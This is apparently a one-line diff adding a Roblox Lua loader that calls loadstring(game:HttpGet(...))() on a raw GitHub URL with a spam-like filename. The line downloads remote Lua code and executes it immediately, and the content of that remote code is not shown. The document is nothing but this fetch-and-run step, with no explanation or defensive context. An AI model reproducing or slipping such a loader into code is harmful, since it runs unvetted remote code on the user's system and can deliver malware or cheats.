@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/TealKnightFree/loaders/main/loaders/update-x-cvr-retro-spam5-mcqp3fzlo9qfp8.lua"))()
